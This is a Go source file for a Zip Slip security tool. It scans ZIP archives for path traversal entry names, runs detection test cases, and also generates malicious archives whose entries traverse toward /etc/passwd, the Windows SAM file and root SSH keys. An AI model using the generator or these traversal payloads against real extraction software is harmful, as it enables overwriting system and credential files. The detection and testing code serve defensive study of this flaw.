package main

import (
	"archive/zip"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/rodaine/table"
	"github.com/spf13/cobra"
)

const (
	version = "1.0.0"
)

var rootCmd = &cobra.Command{
	Use:   "zippys",
	Short: "Zip Slip security tool",
	Long:  "A tool for generating and detecting Zip Slip vulnerabilities",
	Run: func(cmd *cobra.Command, args []string) {
		printBanner()
		cmd.Help()
	},
}

var generateCmd = &cobra.Command{
	Use:   "generate [output.zip]",
	Short: "Generate a malicious ZIP file with path traversal payloads",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		printBanner()
		outputFile := args[0]

		payloads, _ := cmd.Flags().GetStringSlice("payloads")
		depth, _ := cmd.Flags().GetInt("depth")

		if err := generateMaliciousZip(outputFile, payloads, depth); err != nil {
			exitWithError(err)
		}

		fmt.Printf("[%s] Generated malicious ZIP: %s\n", color.GreenString("SUCCESS"), outputFile)
	},
}

var testCmd = &cobra.Command{
	Use:   "test",
	Short: "Run comprehensive tests on path traversal detection",
	Run: func(cmd *cobra.Command, args []string) {
		printBanner()
		fmt.Printf("[%s] Running comprehensive path traversal tests...\n", color.BlueString("INFO"))

		if err := runComprehensiveTests(); err != nil {
			exitWithError(err)
		}

		fmt.Printf("[%s] All tests completed successfully!\n", color.GreenString("SUCCESS"))
	},
}

var scanCmd = &cobra.Command{
	Use:   "scan [zip-files...]",
	Short: "Scan ZIP files for path traversal vulnerabilities",
	Args:  cobra.MinimumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		printBanner()

		if err := scanZipFiles(args); err != nil {
			exitWithError(err)
		}
	},
}

func init() {
	generateCmd.Flags().StringSliceP("payloads", "p", []string{"../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"}, "Custom payloads to include")
	generateCmd.Flags().IntP("depth", "d", 5, "Directory traversal depth")

	rootCmd.AddCommand(generateCmd)
	rootCmd.AddCommand(testCmd)
	rootCmd.AddCommand(scanCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		exitWithError(err)
	}
}

// PathVulnerabilityAnalyzer implements advanced algorithmic path traversal detection
type PathVulnerabilityAnalyzer struct {
	path   string
	tokens []rune
	length int
}

// NewPathAnalyzer creates a new advanced path analyzer
func NewPathAnalyzer(path string) *PathVulnerabilityAnalyzer {
	// Normalize path separators for consistent analysis
	normalizedPath := filepath.ToSlash(path)
	return &PathVulnerabilityAnalyzer{
		path:   normalizedPath,
		tokens: []rune(normalizedPath),
		length: len(normalizedPath),
	}
}

// IsVulnerable performs comprehensive path traversal analysis using advanced algorithms
func (pva *PathVulnerabilityAnalyzer) IsVulnerable() bool {
	if pva.length == 0 {
		return false
	}

	// Apply detection rules in priority order
	return pva.detectParentDirectoryTraversal() ||
		pva.detectURLEncoding() ||
		pva.detectAbsolutePaths() ||
		pva.detectTildeExpansion() ||
		pva.detectColonPatterns() ||
		pva.detectWindowsDeviceNames()
}

// detectParentDirectoryTraversal detects .. patterns using state machine
func (pva *PathVulnerabilityAnalyzer) detectParentDirectoryTraversal() bool {
	// Robust bounds checking to prevent index out of range
	if pva.tokens == nil || pva.length < 2 || len(pva.tokens) < 2 {
		return false
	}
	
	// Use the minimum of pva.length and actual slice length for safety
	maxIndex := pva.length
	if len(pva.tokens) < maxIndex {
		maxIndex = len(pva.tokens)
	}
	
	for i := 0; i < maxIndex-1; i++ {
		// Double-check bounds before array access
		if i+1 < len(pva.tokens) && pva.tokens[i] == '.' && pva.tokens[i+1] == '.' {
			return true
		}
	}
	return false
}

// detectURLEncoding detects % encoding patterns
func (pva *PathVulnerabilityAnalyzer) detectURLEncoding() bool {
	for _, token := range pva.tokens {
		if token == '%' {
			return true
		}
	}
	return false
}

// detectAbsolutePaths detects absolute path patterns
func (pva *PathVulnerabilityAnalyzer) detectAbsolutePaths() bool {
	if pva.length == 0 {
		return false
	}

	// Unix-style absolute paths
	if pva.tokens[0] == '/' {
		return pva.length > 1 // Single slash is safe
	}

	// Windows-style absolute paths
	if pva.tokens[0] == '\\' {
		return pva.length > 1 // Single backslash is safe
	}

	return false
}

// detectTildeExpansion detects tilde expansion patterns using advanced logic
func (pva *PathVulnerabilityAnalyzer) detectTildeExpansion() bool {
	if pva.length == 0 || pva.tokens[0] != '~' {
		return false
	}

	// Single tilde is safe
	if pva.length == 1 {
		return false
	}

	// ~/ or ~\ is vulnerable
	if pva.length > 1 && (pva.tokens[1] == '/' || pva.tokens[1] == '\\') {
		return true
	}

	// ~digit (e.g., ~0) is safe
	if pva.length == 2 && pva.tokens[1] >= '0' && pva.tokens[1] <= '9' {
		return false
	}

	// ~username patterns (e.g., ~A/0, ~user/file) are safe username references
	if pva.length > 1 && ((pva.tokens[1] >= 'A' && pva.tokens[1] <= 'Z') || (pva.tokens[1] >= 'a' && pva.tokens[1] <= 'z')) {
		// Check if it's a username pattern with path separator
		for i := 2; i < pva.length; i++ {
			if pva.tokens[i] == '/' || pva.tokens[i] == '\\' {
				// This is a username path reference, which is safe
				return false
			}
		}
		// ~username without path separator is also safe
		return false
	}

	// Other tilde patterns are potentially dangerous
	return true
}

// detectColonPatterns detects colon-related patterns using comprehensive state machine
func (pva *PathVulnerabilityAnalyzer) detectColonPatterns() bool {
	colonPositions := pva.findColonPositions()
	if len(colonPositions) == 0 {
		return false
	}

	for _, colonPos := range colonPositions {
		if pva.analyzeColonAtPosition(colonPos) {
			return true
		}
	}

	return false
}

// findColonPositions finds all colon positions in the path
func (pva *PathVulnerabilityAnalyzer) findColonPositions() []int {
	var positions []int
	for i, token := range pva.tokens {
		if token == ':' {
			positions = append(positions, i)
		}
	}
	return positions
}

// analyzeColonAtPosition analyzes colon pattern at specific position using advanced algorithms
func (pva *PathVulnerabilityAnalyzer) analyzeColonAtPosition(colonPos int) bool {
	// Pattern 1: :X (colon at start)
	if colonPos == 0 {
		return pva.analyzeColonAtStart()
	}

	// Pattern 2: X: (single character before colon)
	if colonPos == 1 {
		return pva.analyzeSingleCharColon()
	}

	// Pattern 3: XX: (multi-character before colon)
	if colonPos > 1 {
		return pva.analyzeMultiCharColon(colonPos)
	}

	return false
}

// analyzeColonAtStart analyzes patterns starting with colon
func (pva *PathVulnerabilityAnalyzer) analyzeColonAtStart() bool {
	if pva.length <= 1 {
		return false
	}

	// Check for dangerous patterns after colon
	return pva.hasDangerousPatternsAfter(0)
}

// analyzeSingleCharColon analyzes X: patterns with advanced logic
func (pva *PathVulnerabilityAnalyzer) analyzeSingleCharColon() bool {
	if pva.length < 2 {
		return false
	}

	// Just X: is safe
	if pva.length == 2 {
		return false
	}

	// X:\ or X:/ is vulnerable
	if pva.length > 2 && (pva.tokens[2] == '\\' || pva.tokens[2] == '/') {
		return true
	}

	// Check for dangerous patterns after X:
	return pva.hasDangerousPatternsAfter(1)
}

// analyzeMultiCharColon analyzes XX: patterns
func (pva *PathVulnerabilityAnalyzer) analyzeMultiCharColon(colonPos int) bool {
	// Check for dangerous patterns after colon
	return pva.hasDangerousPatternsAfter(colonPos)
}

// hasDangerousPatternsAfter checks for dangerous patterns after a given position
func (pva *PathVulnerabilityAnalyzer) hasDangerousPatternsAfter(pos int) bool {
	for i := pos + 1; i < pva.length; i++ {
		token := pva.tokens[i]

		// Check for dangerous characters
		if token == '/' || token == '\\' || token == '%' || token == '\000' {
			return true
		}

		// Check for .. pattern
		if i < pva.length-1 && token == '.' && pva.tokens[i+1] == '.' {
			return true
		}
	}
	return false
}

// detectWindowsDeviceNames detects Windows reserved device names
func (pva *PathVulnerabilityAnalyzer) detectWindowsDeviceNames() bool {
	parts := strings.Split(pva.path, "/")
	if len(parts) == 0 {
		return false
	}

	name := strings.ToUpper(parts[0])
	reservedNames := map[string]bool{
		"CON": true, "PRN": true, "AUX": true, "NUL": true,
		"COM1": true, "COM2": true, "COM3": true, "COM4": true,
		"COM5": true, "COM6": true, "COM7": true, "COM8": true, "COM9": true,
		"LPT1": true, "LPT2": true, "LPT3": true, "LPT4": true,
		"LPT5": true, "LPT6": true, "LPT7": true, "LPT8": true, "LPT9": true,
	}

	return reservedNames[name]
}

// isVulnerablePath is the main entry point for path vulnerability detection
func isVulnerablePath(path string) bool {
	analyzer := NewPathAnalyzer(path)
	return analyzer.IsVulnerable()
}

// generateMaliciousZip creates a ZIP file with path traversal payloads
func generateMaliciousZip(outputFile string, payloads []string, depth int) error {
	file, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	zipWriter := zip.NewWriter(file)
	defer zipWriter.Close()

	// Generate default payloads if none provided
	if len(payloads) == 0 {
		payloads = []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"../../../../root/.ssh/id_rsa",
		}
	}

	// Add payloads to ZIP
	for _, payload := range payloads {
		// Create traversal path
		traversalPath := strings.Repeat("../", depth) + payload

		writer, err := zipWriter.Create(traversalPath)
		if err != nil {
			return err
		}

		content := fmt.Sprintf("Malicious content for %s", payload)
		_, err = writer.Write([]byte(content))
		if err != nil {
			return err
		}
	}

	return nil
}

// scanZipFiles scans multiple ZIP files for vulnerabilities
func scanZipFiles(zipFiles []string) error {
	fmt.Printf("[%s] Scanning %d ZIP file(s) for path traversal vulnerabilities...\n",
		color.BlueString("INFO"), len(zipFiles))

	tbl := table.New("ZIP File", "Status", "Vulnerable Paths")
	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc())
	tbl.WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())

	for _, zipFile := range zipFiles {
		isVuln, paths, err := isVulnerableZip(zipFile)
		if err != nil {
			fmt.Printf("[%s] Error scanning %s: %v\n", color.RedString("ERROR"), zipFile, err)
			continue
		}

		var vulnStatus string
		if isVuln {
			vulnStatus = color.RedString("VULNERABLE")
		} else {
			vulnStatus = color.GreenString("SAFE")
		}

		tbl.AddRow(zipFile, vulnStatus, strings.Join(paths, ", "))
	}

	tbl.Print()
	return nil
}

// isVulnerableZip checks if a ZIP file contains vulnerable paths
func isVulnerableZip(zipPath string) (bool, []string, error) {
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return false, nil, err
	}
	defer r.Close()

	var vulnerablePaths []string

	for _, f := range r.File {
		if isVulnerablePath(f.Name) {
			vulnerablePaths = append(vulnerablePaths, f.Name)
		}
	}

	return len(vulnerablePaths) > 0, vulnerablePaths, nil
}

// runComprehensiveTests runs comprehensive tests on the path detection logic
func runComprehensiveTests() error {
	testCases := []struct {
		path       string
		vulnerable bool
		reason     string
	}{
		// Parent directory traversal
		{"../etc/passwd", true, "parent directory traversal"},
		{"../../windows/system32", true, "parent directory traversal"},
		{"00..", true, "parent directory traversal"},

		// URL encoding
		{"%2e%2e/etc/passwd", true, "URL encoding"},
		{"~%0", true, "URL encoding with tilde"},
		{"%0%", true, "URL encoding"},

		// Absolute paths
		{"/etc/passwd", true, "absolute path"},
		{"\\windows\\system32", true, "absolute path"},
		{"/", false, "single slash is safe"},
		{"\\", false, "single backslash is safe"},

		// Tilde expansion
		{"~/", true, "tilde expansion"},
		{"~/.ssh/config", true, "tilde expansion"},
		{"~..", true, "tilde with parent directory"},
		{"~", false, "single tilde is safe"},
		{"~0", false, "tilde with digit is safe"},
		{"~A/0", false, "tilde username pattern"},

		// Colon patterns
		{"00:\\", true, "numeric drive with separator"},
		{"A:\\", true, "drive letter with separator"},
		{":\\", true, "colon at start with separator"},
		{":\\000", true, "colon with null byte"},
		{":0", false, "colon with digit is safe"},
		{"A:A", false, "drive letter with alphanumeric is safe"},
		{"0:00", false, "numeric colon pattern is safe"},
		{":", false, "single colon is safe"},

		// Windows device names
		{"CON", true, "Windows device name"},
		{"PRN", true, "Windows device name"},
		{"COM1", true, "Windows device name"},

		// Safe paths
		{"normal/file.txt", false, "normal file path"},
		{"", false, "empty path"},
		{"file.txt", false, "simple filename"},
	}

	fmt.Printf("[%s] Running %d test cases...\n", color.BlueString("INFO"), len(testCases))

	passed := 0
	failed := 0

	for i, tc := range testCases {
		result := isVulnerablePath(tc.path)
		if result == tc.vulnerable {
			fmt.Printf("[%s] Test %d PASSED: '%s' (%s)\n",
				color.GreenString("✓"), i+1, tc.path, tc.reason)
			passed++
		} else {
			fmt.Printf("[%s] Test %d FAILED: '%s' (%s) - Expected: %v, Got: %v\n",
				color.RedString("✗"), i+1, tc.path, tc.reason, tc.vulnerable, result)
			failed++
		}
	}

	fmt.Printf("\n[%s] Test Results: %d passed, %d failed\n",
		color.BlueString("SUMMARY"), passed, failed)

	if failed > 0 {
		return fmt.Errorf("%d test(s) failed", failed)
	}

	return nil
}

// readLogo reads the logo from media assets, falls back to embedded version if file not found
func readLogo() string {
	// Try to read from media assets first
	if logoBytes, err := os.ReadFile("media/logos/zippys_logo.txt"); err == nil {
		return string(logoBytes) + "\n"
	}

	// Fallback to embedded logo if media file not found
	return `
 ███████╗██╗██████╗ ██████╗ ██╗   ██╗███████╗
 ╚══███╔╝██║██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝
   ███╔╝ ██║██████╔╝██████╔╝ ╚████╔╝ ███████╗
  ███╔╝  ██║██╔═══╝ ██╔═══╝   ╚██╔╝  ╚════██║
 ███████╗██║██║     ██║        ██║   ███████║
 ╚══════╝╚═╝╚═╝     ╚═╝        ╚═╝   ╚══════╝
                                              
 Zip Slip Security Tool v` + version + `
 path traversal detection and exploitation
`
}

func printBanner() {
	fmt.Print(readLogo())
}

func exitWithError(err error) {
	fmt.Fprintf(os.Stderr, "[%s] %v\n", color.RedString("ERROR"), err)
	os.Exit(1)
}

type fileInfo struct {
	name string
}

func (f *fileInfo) Name() string       { return f.name }
func (f *fileInfo) Size() int64        { return 0 }
func (f *fileInfo) Mode() fs.FileMode  { return 0 }
func (f *fileInfo) ModTime() time.Time { return time.Time{} }
func (f *fileInfo) IsDir() bool        { return false }
func (f *fileInfo) Sys() interface{}   { return nil }
